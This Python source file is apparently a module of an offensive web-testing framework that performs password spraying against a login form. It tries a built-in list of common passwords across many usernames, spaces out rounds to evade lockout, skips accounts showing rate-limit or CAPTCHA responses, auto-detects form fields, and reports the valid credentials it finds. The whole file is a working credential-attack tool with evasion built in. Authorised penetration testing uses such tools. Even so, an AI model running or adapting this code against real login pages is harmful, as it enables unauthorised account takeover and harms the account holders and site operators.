"""Password spray module — tests a few common passwords against many usernames to avoid lockout."""

from __future__ import annotations
import time
import re
from webforg.core.module import BaseAuxiliaryModule, Option
from webforg.core.target import Target
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich import box

console = Console()


class Scanner(BaseAuxiliaryModule):
    """Password spray — tests a small set of common passwords across many accounts to avoid lockout."""

    name = "Password Sprayer"
    description = "Sprays common passwords against many usernames (low-and-slow to avoid lockout)"
    author = "K0uR1i"
    rank = "good"

    def _build_options(self) -> None:
        super()._build_options()
        self.add_option("TARGETURI", Option(str, required=False, default="/login", description="Login form URL"))
        self.add_option("USERNAMES", Option(str, required=True, description="Username file path or comma-separated usernames"))
        self.add_option("PASSWORDS", Option(str, required=False, default=None, description="Password file or comma-separated passwords (default: common list)"))
        self.add_option("USER_FIELD", Option(str, required=False, default=None, description="Username form field name"))
        self.add_option("PASS_FIELD", Option(str, required=False, default=None, description="Password form field name"))
        self.add_option("METHOD", Option(str, required=False, default="POST", description="HTTP method"))
        self.add_option("FAIL_STRING", Option(str, required=False, default=None, description="String indicating failed login"))
        self.add_option("SUCCESS_STRING", Option(str, required=False, default=None, description="String indicating successful login"))
        self.add_option("DELAY", Option(float, required=False, default=2.0, description="Delay between password rounds (seconds)"))
        self.add_option("LOCKOUT_THRESHOLD", Option(int, required=False, default=5, description="Stop after N consecutive failures per user"))

    def _build_url(self) -> str:
        """Build login URL without double slashes."""
        base = self.target.base_url.rstrip("/")
        target_uri = (self.get_option("TARGETURI") or "/login").lstrip("/")
        return f"{base}/{target_uri}"

    def run(self) -> dict:
        url = self._build_url()
        session = self.target.session
        delay = self.get_option("DELAY") or 2.0

        console.print()
        console.print(f"  [bold red]>[/] Password Sprayer — [bold]{url}[/]")
        console.print(f"  [dim green]>[/] Low-and-slow mode: {delay}s delay between rounds")

        # ── Load usernames ──
        usernames = self._load_usernames(self.get_option("USERNAMES"))
        if not usernames:
            return {"success": False, "error": "No usernames loaded"}

        # ── Load passwords ──
        passwords = self._load_passwords(self.get_option("PASSWORDS"))
        console.print(f"  [dim green]>[/] [bold]{len(usernames)}[/] usernames x [bold]{len(passwords)}[/] passwords")
        console.print()

        # ── Detect fields ──
        user_field = self.get_option("USER_FIELD")
        pass_field = self.get_option("PASS_FIELD")
        if not user_field or not pass_field:
            user_field, pass_field = self._detect_fields(session, url)
            console.print(f"  [dim green]>[/] Fields: user=[bold]{user_field}[/]  pass=[bold]{pass_field}[/]")
        console.print()

        # ── Spray ──
        found_creds = []
        total_attempts = 0
        lockout_users = set()
        fail_string = self.get_option("FAIL_STRING")
        success_string = self.get_option("SUCCESS_STRING")
        start_time = time.time()

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold green]{task.description}[/]"),
            BarColumn(bar_width=30),
            MofNCompleteColumn(),
            TextColumn("•"),
        ) as progress:
            task = progress.add_task("Spraying", total=len(passwords))

            for pwd_idx, password in enumerate(passwords):
                for username in usernames:
                    if username in lockout_users:
                        continue

                    total_attempts += 1

                    try:
                        if (self.get_option("METHOD") or "POST").upper() == "POST":
                            data = {user_field: username, pass_field: password}
                            resp = session.post(url, data=data, timeout=10)
                        else:
                            params = {user_field: username, pass_field: password}
                            resp = session.get(url, params=params, timeout=10)

                        body = resp.text.lower()
                        status = resp.status_code

                        # Lockout check
                        if status == 429 or "locked" in body or "too many" in body or "rate limit" in body or "captcha" in body:
                            lockout_users.add(username)
                            continue

                        # Success check
                        is_success = False
                        if success_string:
                            if success_string.lower() in body:
                                is_success = True
                        else:
                            if fail_string:
                                if fail_string.lower() not in body and status in (200, 302):
                                    is_success = True
                            else:
                                if status in (301, 302, 303) and "login" not in resp.url.lower():
                                    is_success = True

                        if is_success:
                            found_creds.append({"username": username, "password": password, "details": f"HTTP {status}"})
                            console.print(f"  [bold green][OK] FOUND:[/] {username}:{password}")

                    except Exception:
                        pass

                progress.update(task, description=f"Spraying round {pwd_idx + 1}/{len(passwords)} — {password[:8]}...")
                progress.advance(task)

                # Delay between rounds (low-and-slow)
                if pwd_idx < len(passwords) - 1:
                    time.sleep(delay)

        elapsed = time.time() - start_time

        # ── Results ──
        table = Table(title="Password Spray Results", box=box.ROUNDED, border_style="bold red")
        table.add_column("Username", style="bold cyan")
        table.add_column("Password", style="bold yellow")
        table.add_column("Details")

        for r in found_creds:
            table.add_row(r["username"], r["password"], r["details"])

        if found_creds:
            console.print()
            console.print(table)
        else:
            console.print(f"\n  [dim green]>[/] No valid credentials found")

        summary = (
            f"[bold]Attempts:[/] {total_attempts}  "
            f"[bold]Found:[/] {len(found_creds)}  "
            f"[bold]Locked Users:[/] {len(lockout_users)}  "
            f"[bold]Time:[/] {elapsed:.1f}s"
        )
        console.print(Panel(summary, border_style="bold red"))

        if found_creds:
            console.print()
            for r in found_creds:
                console.print(f"  [bold green][OK][/] [bold]{r['username']}[/]:[bold yellow]{r['password']}[/]")

        return {
            "success": True,
            "found": found_creds,
            "attempts": total_attempts,
            "locked_users": list(lockout_users),
            "elapsed": elapsed,
        }

    def _load_usernames(self, value: str) -> list[str]:
        """Load usernames from file or comma-separated string."""
        if not value:
            return []
        value = value.strip()
        if "/" in value or value.endswith(".txt"):
            try:
                with open(value, "r") as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except FileNotFoundError:
                console.print(f"  [bold red]>[/] File not found: {value}")
                return []
        return [u.strip() for u in value.split(",") if u.strip()]

    def _load_passwords(self, value: str) -> list[str]:
        """Load passwords from file, comma-separated, or use defaults."""
        default_passwords = [
            "password", "123456", "admin", "Password1", "password123",
            "letmein", "welcome", "monkey", "dragon", "master",
            "qwerty", "login", "abc123", "111111", "mustang",
            "access", "shadow", "michael", "superman", "1234567890",
        ]

        if not value:
            return default_passwords

        value = value.strip()
        if "/" in value or value.endswith(".txt"):
            try:
                with open(value, "r") as f:
                    lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                    return lines if lines else default_passwords
            except FileNotFoundError:
                console.print(f"  [bold yellow]>[/] File not found: {value}, using defaults")
                return default_passwords
        return [p.strip() for p in value.split(",") if p.strip()]

    def _detect_fields(self, session, url: str) -> tuple[str, str]:
        """Auto-detect username and password form fields."""
        user_field = "username"
        pass_field = "password"
        try:
            resp = session.get(url, timeout=10)
            inputs = re.findall(r'<input[^>]*>', resp.text, re.IGNORECASE)
            for inp in inputs:
                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
                type_match = re.search(r'type=["\']([^"\']+)["\']', inp)
                if name_match:
                    name = name_match.group(1).lower()
                    input_type = type_match.group(1).lower() if type_match else "text"
                    if input_type == "password":
                        pass_field = name_match.group(1)
                    elif any(kw in name for kw in ("user", "login", "email", "account")):
                        user_field = name_match.group(1)
                    elif input_type == "text" and user_field == "username":
                        user_field = name_match.group(1)
        except Exception:
            pass
        return user_field, pass_field
